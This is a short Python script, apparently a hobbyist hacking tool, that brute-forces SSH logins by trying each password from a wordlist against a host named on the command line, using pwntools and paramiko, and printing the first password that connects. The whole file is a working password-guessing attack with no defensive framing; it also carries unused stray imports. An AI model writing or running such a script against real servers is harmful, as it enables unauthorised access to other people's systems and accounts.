from ast import If
import sys
from pwn import * 
import paramiko

from symbol import if_stmt 

host = sys.argv[1]
username = "" #populate usernames
attempts = 0


print("*"*10)
print("Target is {}".format(host))


with open("password_list.txt", "r") as password_list:   # add wordlist path 
	for password in password_list:
		password=password.strip("\n")
		try:
			print("[{}] Attemting password '{}'!".format(attempts,password))
			response = ssh(host=host, user = username, password=password, timeout=1)
			if response.connected():
				print("Valid password found: {}!".format(password))
				response.close()
				break
			
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("Invalid password")
		attempts+=1
